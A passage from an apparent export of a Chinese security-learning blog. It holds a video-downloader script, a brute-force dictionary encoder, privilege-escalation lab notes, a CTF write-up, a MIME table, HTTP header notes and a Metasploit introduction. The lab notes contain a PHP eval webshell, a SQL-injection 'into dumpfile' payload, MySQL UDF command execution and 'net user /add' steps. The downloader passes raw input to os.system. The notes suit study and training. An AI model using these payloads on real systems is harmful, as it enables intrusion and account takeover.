print('-----------------------进入批量下载模式-----------------------\\n')\n        file2 , url2 = getchara()\n        mutildownload( file2 , url2 )\n    elif tag == 'b':\n        print(\"-----------------------进入单次下载模式-----------------------\\n\")    \n        file1 , url1 = getcharb()\n        download( file1 , url1 )\n    else:\n        print(\"无效的选项，程序将会关闭\\n\" + \"5\\n\" + '4\\n' + \"3\\n\" + \"2\\n\" +\"1\")\n        exit()\n\ndef info():\n    print(\"-----------------------A1andNS video download-----------------------\" + '\\n' + \"This is a program \\\nbased on you-get , you can use it to download the video from vidoe website , such as \\\nbilibili , tencent video and so on.\")\n    print(\"请输入字母a以批量下载或输入字母b以单次下载！！！\")\n\ndef getcharb():\n    file1 = input(\"请输入一个保存路径:\")\n    url1 = input(\"请输入一个视频链接:\")\n    return file1 , url1\n\ndef getchara():\n    file2 = input(\"请输入一个保存路径:\")\n    url2 = input(\"请输入你存放URL的文本文件的绝对路径（注意：URL应当每行只存放一个）:\")\n    return file2 , url2\n\ndef download(file1 , url1):\n    try:\n        os.system(\"you-get \" + '-o ' + file1 + \" \" + url1)\n        print(\"运行成功！！！\")\n    except:\n        print(\"运行失败！！！\\n\" + \"5\\n\" +'4\\n' + \"3\\n\" + \"2\\n\" + \"1\")\n        exit()\n\ndef mutildownload( file2 , url2 ):\n    f = open( url2 )\n    lines = f.readlines()\n    try:\n        for line in lines:\n            download( file2 , line )\n        print(\"运行成功\")\n    except:\n        print(\"运行失败！！！\" + \"5\\n\" +'4\\n' + \"3\\n\" + \"2\\n\" + \"1\")\n    f.closed()\n\nmain()\n\n\n\n\n单次下载成功下载结果如下：\n\n批量下载批量下载时，使用一个url字典来实现，url存储格式如下图：\n\n成功执行，把3个视频都下载下来了。\n\n\n这个You-get工具正是一个好东西啊，感觉很棒，开发者大大牛逼。吹爆！！！\n注意（1）各大视频网站需要登录观看的视频无法直接下载 \n（2）有些网站视频需要设置代理\n","slug":"Python之You-Get库学习","date":"2020-03-15T03:23:16.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"ecc4b30ae0ba12a4d421eed8804c1ec9","title":"Python之base64编码字典","content":"在CTF中总会关系到编码或者加密，今天就写了一个可以把爆破字典里的密码全部进行base64编码并且生成一个新字典。这里是编写来进行Authorization其实也是搞了很久，总是会报错，具体看下面吧！\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\n源代码import base64\n \nf&#x3D;open(&#39;1.txt&#39;,&#39;r&#39;)\nt&#x3D;open(&#39;2.txt&#39;,&#39;w&#39;)\nlines&#x3D;f.readlines()\nfor line in lines:\n    AU&#x3D;&quot;admin:&quot;+line.strip(&#39;\\n&#39;)             #这里是使用与Authorization认证使用的，所以加了以一个&#39;admin:&#39;，如果只需要编码字典内容，就去掉&#39;admin:&#39;即可。\n    AU64&#x3D;base64.b64encode(AU.encode(&#39;utf-8&#39;))   #这里先utf-8编码一下，好像是因为Python 3默认使用Unicode，否则就会导致运行这个编码脚本是会报错。\n    AU2 &#x3D; str(AU64,&#39;utf-8&#39;)\t#这里必须要先转换为字符串，否则将无法输出和写入。\n    print(AU2)\n    t.write(AU2)\n    t.write(&quot;\\n&quot;)\n \nf.close()\nt.close()\n\n使用说明在Python程序所在的目录下，放在字典1.txt，然后运行程序，既可以在目录下导出新字典2.txt\n运行效果\n\n\n","slug":"Python之base64编码字典","date":"2020-03-11T14:02:12.000Z","categories_index":"Python学习","tags_index":"网络安全,Python","author_index":"A1andNS"},{"id":"b583a7e507092282017e6448184320ad","title":"提权知识学习","content":"今天学习了一下提权和密码破解的相关知识，所以写一篇blog记录一下。\n提权简介提权，看名字就知道是提升自己在服务器中的权限，比如在Windows中把普通用户提权为超级管理员，这样普通用户就拿到了管理员权限，拥有了管理Windows的所有权限了。\n提权类型操作系统内核提权\nWindows提权\nLinux提权\n\n数据库漏洞提权\nMySQL提权\nsqlserver提权\n\n应用程序漏洞提权\nservu提权\npcanywhere提权\n\n其他提权方式\n第三方组件提权\n文件系统权限配置不当权限\n\nPR提权原理PR提权利用的是漏洞全称为Microsoft Windows RPCSS服务隔离本地权限提升漏洞，这个名字有点长啊。微软发布的漏洞公告为MS09-012（KB952004），对应的CVE为CVE-2009-0079 。\nRPCSS服务没有正确地隔离NetworkService或LocalService账号下运行的进程，本地攻击者可以利用令牌劫持的方式获得权限提升。成功利用此漏洞的攻击者可以完全控制受影响的系统， 攻击者可安装程序。查看、修改、删除数据。或者创建一个拥有完全用户权限是的新账户。\nPR提权受影响系统MIcrosoft Windows XP x64 SP2\nMIcrosoft Windows XP x64\nMIcrosoft Windows XP SP3\nMIcrosoft Windows XP SP2\nMicrosoft Windows Server 2003 SP2\nMicrosoft Windows Server 2003 SP2\nPR提权使用思路\n上传木马，获取webshell，使用菜刀或者antsword连接。\n上传 cmd.exe和pr.exe文件到有执行权限的目录下。使用菜刀或者antsword的虚拟终端启动cmd.exe .就可以执行一些命令，但是权限很低。所以就运行pr.exe来执行命令。\n使用pr.exe创建一个管理员用户，并且开放3389端口。\n使用账号密码，远程连接控制。\n\nmimikatzmimikatz出自法国大神Benjamin Delpy之手，可以直接获取到大多数windows平台下的明文密码，相比于其他工具，最大的特点是速度极快，无需等待。工具原理是从Isass.exe进程中直接获取密码信息进行破解，而且该破解应该并非穷举方式，而是直接根据算法进行反向计算。\n可以上传此工具，然后使用pr.exe文件管理员权限运行来获取目标机的用户名和密码。运行此工具会在目录下生成一个包含用户信息的log文件。\n脏牛提权原理该漏洞是Linux的一个本地提权漏洞，发现者是Phil Oester，影响&gt;=2.6.22的所有Linux内核版本，修复时间是2016年10月18号。该漏洞具体为，Linux内核的内存子系统在处理写入时复制（copy-on-write,COW)时产生了竞争条件（race condition)。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。\n首先运行gcc cowroot.c -0 test -pthread命令，然后在该目录下回产生一个test文件，使用cowroot.c test命令。执行完成后就可以还要供id命令查权限，一般都是会得到root权限，这只针对于旧的未修复漏洞的系统所在机器。\nMySQL UDF提权UDF是MySQL的一个拓展接口，也可以称为用户自定义函数，它是用来拓展MySQL的技术手段，用户通过自定义函数来实现一些MySQL中无法实现的功能，新函数也可以在SQL语句里被调用。UDF提权是利用MySQL自定义函数功能，将MySQL账号转化为系统system权限。\n提权条件\nMySQL版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\\plugin文件夹下。\nMySQL版本小于5.1版本，udf.dll文件在Windows2003下放置于c:\\windows\\system32，在windows2000下放于c:\\winnt\\system32.\n可以将udf.dll 写入到相应目录的权限。\n掌握的MySQL数据库账号以具备root账号所具备权限的账号为好，最好是root账户。\n\nMySQL UDF提权实操下面进行一下实操\n实验环境\n\n\n\n\n\n\n\n\n\n操作机：windows xp\nIP：172.16.11.2\n目标机：Windows 2003 靶机\n实验平台： i春秋\n\n已知信息首先我们要寻找网站存在的漏洞，这里使用的是DVWA靶机，而本次实验是默认找到了SQL注入点，并且通过SQL注入获知目标机Web根目录是C:\\www\\ \n得知本地主机localhost的root账户的密码hash是*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B。密码解密后为root。并且已经上传了一个一句话webshell。\n&lt;?php @eval($_POST['pass']);?>\n#并且为了避免转义字符，所以使用了16进制上传。转换16进制后为3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e\n\n并且已经通过http://172.16.12.2/dwva/vulnerabilities/sqli/test.php?id=-1 union select 0x3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e,2,3 into dumpfile &#39;c:/www/small.php&#39;把webshell移动到了C:\\www\\目录下，由此可知webshell在http://172.16.12.2/small.php，密码为pass 。\n#这是创建文件时的命令\ncreate function cmdshell returns string soname &#39;udf.dll&#39;;\n#假设此时udf.dll被上传到了c:\\windows\\system32目录\n\ncreate function cmdshell returns string soname &#39;C:udf.dll&#39;;\n#假设此时udf.dll被上传到了C盘根目录目录\n\ncreate function cmdshell returns string soname &#39;udf.dll&#39;;\n#假设此时udf.dll被上传到了任意的环境变量目录，如C:\\php\\\n\n开始操作首先使用菜刀连接webshell，然后进行数据库管理。使用select version（）;查询MySQL版本。结果是5.5.40，这是一个大于5.1的MySQL版本。\nMYSQL5.1及之后的几个版本又多了一个限制：创建函数时所用的DLL只能放在mysql的plugin目录里面，而且这个plugin目录默认是不存在的，可能就是为了防止黑客通过导出文件的方式将DLL来写到这个文件夹，如果导出文件（into dumpfile）的目标目录不存在是会报错的。\n所以使用select @@basedir,可以得知C:/Program Files/phpStudy/MySQL/为目标主机的MySQL安装根目录，所以我们的导出文件目录应该是C:/Program Files/phpStudy/MySQL/lib/plugin,接下来我们把dll上传到web根目录，然后通过select load_file(&#39;C:/www/udf.dll&#39;) into dumpfile &#39;C:/Program Files/phpStudy/MySQL/lib/plugin/udf.dll&#39;;来移动到plugin目录下\n\n提示查询结果为空，所以可能是导出文件不成功也有可能是plugin目录不存在。所以用菜刀查看一下。\n\n结果发现plugin目录不存在，所以我们要创建一个plugin文件夹，可以使用SQL语句创建，也可以直接试试看PHP创建可不可以。结果发现是可以创建，说明这个目录下我们的权限没有被限制。成功创建了plugin文件夹后，就是继续前面的导入工作了。\n\n导入成功后，然后就可以开始创建udf.dll文件中包含的函数了，这里我要创建一个shell函数，使用select function shell returns string soname &#39;udf.dll&#39;;\n\n这样就成功创建了一个shell函数，而这个函数就是用来执行命令的，使用格式为select shell(&#39;cmd&#39;,&#39;comand&#39;),其中comand是命令。然后开始重头戏，命令执行阶段。我的目标是在服务器上创建一个拥有管理员权限的A1andNS用户。先来试试命令，看看效果，感觉挺不错的。很多重要信息我们都可以看到了。\n\n下面开始创建一个新用户ichunqiu.使用命令select shell(&#39;cmd&#39;,&#39;net user ichunqiu ichunqiu /add&#39;);\n\n然后我就要把A1andNS加入到管理员组里了，使用命令select shell(&#39;cmd&#39;,&#39;net user ichuqniu&#39;);查看一下\n\n这就说明提权成功了。接着我们可以删除函数drop function shell;避免被他人利用了。\n参考信息i春秋实验指导书\n","slug":"提权知识学习","date":"2020-03-10T11:08:25.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB,权限提升","author_index":"A1andNS"},{"id":"2e3b9c7b91bc48ac2226d050fa8b2439","title":"Hackinglab基础关Write Up","content":"第一题：key在哪里？打开目标网站，按他的提示就在这里，查看网页源代码就得到了key is jflsjklejflkdsjfklds\n第二题：再加密一次你就的到key根据提示我们知道了明文加密一次后是密文，再加密一次又可以得到明文，故判定是rot13加密的，我使用了CTFCrakTools进行rot13解密，从而得到一个key\n第三题：猜猜这是经过了多少次加密看到密文是以=结尾马上联想到base64编码，故进行base64解密，最后得到key。\n\n第四题：据说MD5加密很安全，真的是么？直接对密文进行MD5解密，得到答案。\n\n第五题：种族歧视打开网站发现无法访问，根据题目提示知道是accept-language的问题。网站一般通过识别请求头中的接受语言判断访问者的国籍。所以我把浏览器语言改成English问题就解决了，得到key。\n\n第六题：HAHA浏览器打开网站提示需要使用HAHA浏览器打开，很明显没有什么HAHA浏览器，那么我就使用burpsuit抓包，更改请求头里的UA信息，把浏览器改成HAHA，重发数据包得到key。\n第七题：key究竟在哪里进入网页首先打开控制台，查看源代码。发现源代码里面没有需要的信息。转到网络模块查看响应头，发现key藏在里面。\n\n第八题：key又找不到了打开网站发现有个链接写着到“这里找key”，于是我试着打开它看看。发现里面写着没有密码，于是尝试看看网页源码，发现也没有。找了半天都没有，结合他的密码不在这里的提示，于是我决定用burpsuit抓个包试试看，包一抓发现有个状态码为302的包。\n于是进去看看，发现回应包里面有货，在返回的HTML里有一个key_is_here_now_.php网页，copy一下到url试一下，得到key: ohHTTP302dd\n\n第九题：冒充登陆用户进入网站发现需要登陆，但是没有登陆框，也是打开控制台查看网络看请求头和回应头，发现login=0，于是我们通过burpsuit进行抓包，修改数据包的头部把login=0改成login=1释放数据包，得到key。\n第十题：比较数字大小首先我先试着提交一下发现，只能输入3位数，这说明输入框的长度被限制了。我查看源代码，发现确实如此，我把长度改成比3大的数字，然后再输入数据，（例如我把长度改成了6位后，输入111111提交）得到key。\n第十一题：本地的诱惑打开网页提示需要从本地访问，打开查看源代码，发现隐藏了php语句，发现key\n\n第十二题：就不让你访问\n日常看看源代码有没有秘密，发现也没有。\n看看响应头发现什么都没有。\nburpsuit抓个包也没有。。。。。\n看来就是需要找到后台所在，考察后台查找\n直接先试一下login.php和/admin/login.php以及manager.php之类的常见的后台发现都不行。\n于是我们查看网站信息用蜘蛛协议，robots.txt\n发现disallow，把disallow加到url的末尾访问\n\n结果。。。。\n还不是叫我继续。。。。。\n那就直接在这个目录下面试一试index.php\n发现还是这个网页\n那我再试一下login.php\n发现成功了得到了key\n这里解释一下蜘蛛协议的内容，User-agent: * 这里的代表所有的搜索引擎种类，*是一个通配符。\ndisallow：/xxxx/    表示禁止搜索引擎访问的目录\n这里解释一下蜘蛛协议的内容，User-agent: * 这里的代表所有的搜索引擎种类，*是一个通配符。\ndisallow：/xxxx/    表示禁止搜索引擎访问的目录\n备份一下php的==利用0e开头的md5和原值：\ns878926199a\n0e545993274517709034328855841020\ns155964671a\n0e342768416822451524974117254469\ns214587387a\n0e848240448830537924465865611904\ns214587387a\n0e848240448830537924465865611904\ns878926199a\n0e545993274517709034328855841020\ns1091221200a\n0e940624217856561557816327384675\ns1885207154a\n0e509367213418206700842008763514\ns1502113478a\n0e861580163291561247404381396064\ns1885207154a\n0e509367213418206700842008763514\ns1836677006a\n0e481036490867661113260034900752\ns155964671a\n0e342768416822451524974117254469\ns1184209335a\n0e072485820392773389523109082030\ns1665632922a\n0e731198061491163073197128363787\ns1502113478a\n0e861580163291561247404381396064\ns1836677006a\n0e481036490867661113260034900752\ns1091221200a\n0e940624217856561557816327384675\ns155964671a\n0e342768416822451524974117254469\ns1502113478a\n0e861580163291561247404381396064\ns155964671a\n0e342768416822451524974117254469\ns1665632922a\n0e731198061491163073197128363787\ns155964671a\n0e342768416822451524974117254469\ns1091221200a\n0e940624217856561557816327384675\ns1836677006a\n0e481036490867661113260034900752\ns1885207154a\n0e509367213418206700842008763514\ns532378020a\n0e220463095855511507588041205815\ns878926199a\n0e545993274517709034328855841020\ns1091221200a\n0e940624217856561557816327384675\ns214587387a\n0e848240448830537924465865611904\ns1502113478a\n0e861580163291561247404381396064\ns1091221200a\n0e940624217856561557816327384675\ns1665632922a\n0e731198061491163073197128363787\ns1885207154a\n0e509367213418206700842008763514\ns1836677006a\n0e481036490867661113260034900752\ns1665632922a\n0e731198061491163073197128363787\ns878926199a\n0e545993274517709034328855841020","slug":"Hackinglab基础关Write-Up","date":"2020-03-09T08:04:44.000Z","categories_index":"CTF","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"7608810a314c552a7d790b7ee545ec15","title":"MIME类型","content":"媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。本文只为方便查询相应格式文件的MIME类型\n\n\n\n扩展名\n文档类型\nMIME 类型\n\n\n\n.aac\nAAC audio\naudio/aac\n\n\n.abw\nAbiWord document\napplication/x-abiword\n\n\n.arc\nArchive document (multiple files embedded)\napplication/x-freearc\n\n\n.avi\nAVI: Audio Video Interleave\nvideo/x-msvideo\n\n\n.azw\nAmazon Kindle eBook format\napplication/vnd.amazon.ebook\n\n\n.bin\nAny kind of binary data\napplication/octet-stream\n\n\n.bmp\nWindows OS/2 Bitmap Graphics\nimage/bmp\n\n\n.bz\nBZip archive\napplication/x-bzip\n\n\n.bz2\nBZip2 archive\napplication/x-bzip2\n\n\n.csh\nC-Shell script\napplication/x-csh\n\n\n.css\nCascading Style Sheets (CSS)\ntext/css\n\n\n.csv\nComma-separated values (CSV)\ntext/csv\n\n\n.doc\nMicrosoft Word\napplication/msword\n\n\n.docx\nMicrosoft Word (OpenXML)\napplication/vnd.openxmlformats-officedocument.wordprocessingml.document\n\n\n.eot\nMS Embedded OpenType fonts\napplication/vnd.ms-fontobject\n\n\n.epub\nElectronic publication (EPUB)\napplication/epub+zip\n\n\n.gif\nGraphics Interchange Format (GIF)\nimage/gif\n\n\n.htm     .html\nHyperText Markup Language (HTML)\ntext/html\n\n\n.ico\nIcon format\nimage/vnd.microsoft.icon\n\n\n.ics\niCalendar format\ntext/calendar\n\n\n.jar\nJava Archive (JAR)\napplication/java-archive\n\n\n.jpeg      .jpg\nJPEG images\nimage/jpeg\n\n\n.js\nJavaScript\ntext/javascript\n\n\n.json\nJSON format\napplication/json\n\n\n.jsonld\nJSON-LD format\napplication/ld+json\n\n\n.mid      .midi\nMusical Instrument Digital Interface (MIDI)\naudio/midi audio/x-midi\n\n\n.mjs\nJavaScript module\ntext/javascript\n\n\n.mp3\nMP3 audio\naudio/mpeg\n\n\n.mpeg\nMPEG Video\nvideo/mpeg\n\n\n.mpkg\nApple Installer Package\napplication/vnd.apple.installer+xml\n\n\n.odp\nOpenDocument presentation document\napplication/vnd.oasis.opendocument.presentation\n\n\n.ods\nOpenDocument spreadsheet document\napplication/vnd.oasis.opendocument.spreadsheet\n\n\n.odt\nOpenDocument text document\napplication/vnd.oasis.opendocument.text\n\n\n.oga\nOGG audio\naudio/ogg\n\n\n.ogv\nOGG video\nvideo/ogg\n\n\n.ogx\nOGG\napplication/ogg\n\n\n.otf\nOpenType font\nfont/otf\n\n\n.png\nPortable Network Graphics\nimage/png\n\n\n.pdf\nAdobe Portable Document Format (PDF)\napplication/pdf\n\n\n.ppt\nMicrosoft PowerPoint\napplication/vnd.ms-powerpoint\n\n\n.pptx\nMicrosoft PowerPoint (OpenXML)\napplication/vnd.openxmlformats-officedocument.presentationml.presentation\n\n\n.rar\nRAR archive\napplication/x-rar-compressed\n\n\n.rtf\nRich Text Format (RTF)\napplication/rtf\n\n\n.sh\nBourne shell script\napplication/x-sh\n\n\n.svg\nScalable Vector Graphics (SVG)\nimage/svg+xml\n\n\n.swf\nSmall web format (SWF) or Adobe Flash document\napplication/x-shockwave-flash\n\n\n.tar\nTape Archive (TAR)\napplication/x-tar\n\n\n.tif     .tiff\nTagged Image File Format (TIFF)\nimage/tiff\n\n\n.ttf\nTrueType Font\nfont/ttf\n\n\n.txt\nText, (generally ASCII or ISO 8859-n)\ntext/plain\n\n\n.vsd\nMicrosoft Visio\napplication/vnd.visio\n\n\n.wav\nWaveform Audio Format\naudio/wav\n\n\n.weba\nWEBM audio\naudio/webm\n\n\n.webm\nWEBM video\nvideo/webm\n\n\n.webp\nWEBP image\nimage/webp\n\n\n.woff\nWeb Open Font Format (WOFF)\nfont/woff\n\n\n.woff2\nWeb Open Font Format (WOFF)\nfont/woff2\n\n\n.xhtml\nXHTML\napplication/xhtml+xml\n\n\n.xls\nMicrosoft Excel\napplication/vnd.ms-excel\n\n\n.xlsx\nMicrosoft Excel (OpenXML)\napplication/vnd.openxmlformats-officedocument.spreadsheetml.sheet\n\n\n.xml\nXML\napplication/xml 代码对普通用户来说不可读 (RFC 3023, section 3)      text/xml 代码对普通用户来说可读 (RFC 3023, section 3)\n\n\n.xul\nXUL\napplication/vnd.mozilla.xul+xml\n\n\n.zip\nZIP archive\napplication/zip\n\n\n.3gp\n3GPP audio/video container\nvideo/3gpp      audio/3gpp（若不含视频）\n\n\n.3g2\n3GPP2 audio/video container\nvideo/3gpp2      audio/3gpp2（若不含视频）\n\n\n.7z\n7-zip archive\napplication/x-7z-compressed\n\n\n参考文献[1] https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types[2]https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types感谢MSD web docs对互联网事业的贡献\n","slug":"MIME类型","date":"2020-03-09T08:03:50.000Z","categories_index":"学习笔记","tags_index":"网络安全","author_index":"A1andNS"},{"id":"fa89043ea17343f99a80dd6e1c6c7c73","title":"HTTP头文件（持续更新）","content":"HTTP头文件简介（持续更新）HTTP头文件可以包含很多有用的信息，但作为初学者大多数是不清楚这些内容的含义和作用，故我在学习过程中记录下主要的头文件内容的含义和作用，以备后续考查。本文会不定期持续更新。。。。。。\n请求头下图为火狐浏览器的火狐主页https://home.firefoxchina.com的请求头。一个请求头中包含了很多的信息，但对于初学者而言，一脸懵逼，内心迷茫。那么开始记录了。。。。写在最前面\n;q= (qvalues weighting)    值代表优先顺序，用相对质量价值 表示，又称为权重。\n在后面的个种头中经常出现\n进入正题：\nAccept表示用户代理希望接受的资源类型，即MIME类型。\nAccept: /\n这里举几个例子：\n.mp3的格式是audio/mpeg\n.htm和.html是text/html\n.jpg和.jpeg是image/jpeg\n更多内容见链接：https://blog.csdn.net/qq_26139045/article/details/102508082\nAccept-Encoding将客户端能够理解的内容编码方式——通常是某种压缩算法——进行通知（给服务端）。通过内容协商的方式，服务端会选择一个客户端提议的方式，使用并在响应头 Content-Encoding 中通知客户端该选择\ngzip:表示采用LZ77压缩算法，以及32位CRC校验的编码方式\ncompress：采用LZW压缩算法\ndeflate：采用zlib结构和deflate压缩算法\nbr：表示采用Brotil算法的编码方式\nidentity：用于指代自身（例如：未经过压缩和修改）。除非特别指明，这个标记始终可以被接受。\nAccept-language告知服务端客户端可以理解的自然语言，用来说明用户希望使用的语言和语言组，实现用户语言定制化。\n有一些网站会通过读取语言内容来限制指定语言用户访问，例如，笔者在之前遇到过一个钓鱼网站，在笔者浏览器设置的语言为EN时，钓鱼网站禁止了我的访问，将语言设置回汉字就会发现网站又可以访问了。这是一种简单的过滤指定用户的根据。\nCache-Control通用消息头字段，通过指定指令控制来实现缓存机制\nCache-Control: max-age=Cache-Control: max-stale[=]Cache-Control: min-fresh=Cache-control: no-cacheCache-control: no-storeCache-control: no-transformCache-control: only-if-cached\nConnection用于决定当前的事务完成后，是否会关闭网络连接。如果该值是“keep-alive”，网络连接就是持久的，不会关闭，使得对同一个服务器的请求可以继续在该连接上完成。\n如果是close，表明客户端或服务器想要关闭该网络连接\nCookie其中含有先前由服务器通过 Set-Cookie  首部投放并存储到客户端的 HTTP cookies。这个首部可能会被完全移除，例如在浏览器的隐私设置里面设置为禁用cookie，服务器将不会在你的计算机里 存放cookie。\nHost指明了服务器的域名（对于虚拟主机来说），以及（可选的）服务器监听的TCP端口号。\n语法：Host::\nUpgrade-Insecure-Requests用来向服务器端发送信号，表明自己支持升级机制，客户端优先选择加密及带有身份验证的响应。\nUser-agent这个大家应该会比较熟悉，这个就是用户代理，也经常被写作UA。它用来告知服务端发起请求的用户代理软件的应用类型、操作系统、软件开发商以及版本号。\n通过修改UA信息可以欺骗服务端你的系统和浏览器产品，通过UA来判断操作系统和浏览器内核以提供更好的浏览体验是一个简单应用。\nReferer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。\n故可以通过添加或修改referer头来实现欺骗服务端，伪造我们的来源页面。以此越过一些网页的这种跳转访问要求。\nX-Forwarded-For可以被用来获取最初发起请求的客户端的IP地址，网站通过它来检查最初IP，故我们利用它来使用伪造客户端IP地址， 这样就可以欺骗服务端了。\n语法：X-forwarded-For: 127.0.0.1,70.41.3.18, 150.172.238.178\n格式为IP地址，代理，最近代理\n响应头下图为火狐浏览器的火狐主页https://home.firefoxchina.com的响应头。与请求头相同内容不在解释了。\n\nContent-encoding它和accept-encoding是一对，告知客户端内容使用何种编码方式\n详细可见请求头的Accept-encoding\nAge 消息头里包含消息对象在缓存代理中存贮的时长，以秒为单位。\nContent-Security-Policy允许站点管理者控制用户代理能够为指定的页面加载哪些资源。除了少数例外情况，设置的政策主要涉及指定服务器的源和脚本结束点。这将帮助防止跨站脚本攻击XSS，对网站的资源进行限制。\nContent-type告知客户端响应资源的类型属于哪一种，也是MIME格式，具体可以参考请求头的Accept\nDate显示数据报文建立的日期和时间\nServer包含了处理请求的源头服务器所用到的软件相关信息\n通过查看server内容我们可以知道服务端的相关信息\n例如：使用nginx或apache，操作系统类型是Unix、Linux、windows等\nTransfer-Encoding 消息首部指明了将 entity安全传递给用户所采用的编码形式。\nVia  /x-Via是一个通用首部，是由代理服务器添加的，适用于正向和反向代理，在请求和响应首部中均可出现。这个消息首部可以用来追踪消息转发情况，防止循环请求，以及识别在请求或响应传递链中消息发送者对于协议的支持能力。\n通过via我们可以知道使用的协议、协议版本、公共代理URL及端口号、内部代理名称或别名。\n参考文献[1]https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers\n","slug":"HTTP头文件（持续更新）","date":"2020-03-09T08:03:01.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"da0bd7cce36ba07293df734f9332fbf1","title":"Metasploit入门上手","content":"Metasploit入门上手今天是2019年10月24日打卡嘀嘀嘀！！！菜鸟卡！！一起学习进步！！！\n基本介绍发展历史开源软件metasploit是由HD Moore在2003年创立的，并在2003年10月发布了第一个版本。它集成了11个渗透攻击模块。\n版本metasploit分为两个版本，一个是专业版一个是精简版。当然专业版是要收费的。。。。当然虽然有些东西要付费但是你想要也未必就没有。\nMetasploit基本模块模块类型metasploit的模块有很多，根据用途的不同大概分为一下几类，渗透模块，辅助模块，攻击载荷模块，Shellcode模块。\n渗透模块这个模块是metasploit的最核心功能组件了，还可以细分为渗透攻击模块和后渗透攻击模块。主要就是漏洞利用和利用配置弱点发起攻击。如果你想要看渗透攻击的源代码，可以去metasploit源代码目录的modules/exploits子目录下找到。\n对于渗透攻击模组，它的 攻击行为也可以分为两种：主动渗透攻击和被动渗透攻击。\n主动当然就是我们利用存在的安全漏洞，对网络服务端软件或者应用程序之间的联系进行攻击。主要是发起基于服务的攻击，注入恶意执行代码，触发漏洞。一般恶意代码也会包含一些payloads，这样就可以窃取控制权。一般多见的都是主动渗透了，攻击web应用，甚至工控系统服务。注：工控安全目前也称为一个重要的行业关注点。\n被动渗透攻击针对主要是客户端软件，还要用户自己把恶意内容输进去，这个就很考验社会工程学水平了，你得诱骗用户。没错就是诱骗，接下来就是利用用户自己触发漏洞，从而到达了控制用户系统的目的。注：社工也挺重要的。\n辅助模块辅助模块主要是为信息收集环节提供了大量的情报支持，也可以进行网络扫描查点，甚至构建虚假服务去获取用户的密码。\n攻击载荷模块所谓的攻击载荷模块就是大家常说的Payload，它是在渗透攻击成功以后再目标系统上植入一段可以执行的代码，以此帮助攻击者取得目标系统上的攻击会话。metasploit上就提供了各种各样的Payload，这些都可以供我们使用，福利啊！\nShellcode模块如果说Payloads是metasploit里的炸弹，那么shellcode就是其中的TNT炸药。再完成渗透攻击后，shellcode模块会被攻击者植入到目标系统上，创建后门，上传恶意代码，再执行攻击载荷中相应的命令产生Shell，以达到偷偷对目标系统进行破坏或信息窃取的目的。\nmetasploit的使用metasploit可以通过不同的方式打开，建议使用图形化界面的方式，毕竟我们还是图形化比较习惯，不过你是大佬就无所谓了。在打开Metasploit之前首先要启用Metasploit服务。如果网络不稳定或者计算机资源不足时，需要对metasploit服务进行重启。\n不过从kali Linux 2开始，系统就没有metasploit服务了，所以原来的service metasploit start的启动方式就废了。\n在kali 2版本中启动自带数据库支持的MSF就需要别的办法了：\n（1）打开postgresql数据库\nservice postgresql start\n（2）初始化MSF数据库\nmsfdb init\n（3）运行msfconsole\nmsfconsole\n（4）在msf中查看数据库连接状态：\ndb_status\n\n这样就启动成功了。\n接下来我们启动Metasploit图形化界面armitag。\n可是我发现我的kali里居然没有Armitage，所以我用了上次提到的apt-get命令下载了一个Armitage\n打开后，会显示如下图片\n\n这里显示了Metasploit的服务基本信息。点击connect连接服务，会出现一个metasploit的RPC服务，单击“是”就好了。然后就会显示预配置模块、活跃的目标系统和metasploit标签。对所有的主机进行扫描，就选择Hosts-&gt;Nmap-&gt;Scan-&gt;Quick Scan扫描结果如下：\n还可以对单个ip地址进行nmap扫描，就会得到更多的有用信息，例如上图我们可以看到IP地址和MAC地址以及网卡是intel公司的。在一定程度上可以分辨目标ip的品牌，如我下面说的手机。\n我在以我的手机为例，扫描我的手机的IP地址得到下图：可以看出我的这台设备是属于摩托罗拉移动的设备。注：联想品牌和moto同属摩托罗拉移动。\n扫描结束后，单击左上栏的Attacks按钮，然后选择Find Attacks，找到可以攻击的目标和方法，然后再次右击目标主机的时候就会出现攻击选项，这个时候就可以对其进行攻击了。\n在攻击选项里可以看到很多的子选项，这些都是可供攻击的攻击漏洞。此时就已经可以在预配置模块中选择攻击方式，我们在预配置模块中选择exploit/Windows/browser/adobe_cooltype_sing模块。\n通过选择adobe_cooltype_sing使其显示为以下模块。\n它会在主机上创建一个PDF文件，而且这个PDF文件可以包含了恶意代码或者攻击载荷模块。如果有主机访问了这个PDF文档我们将会获取到该主机的详细信息，包括操作系统和使用的浏览器等信息。\n比如现在我的电脑访问了http://192.168.199.172:8080/7gwC8kcfVO就会看到这个PDF我就可以在Kali上看到我的这台Windows是Windows10 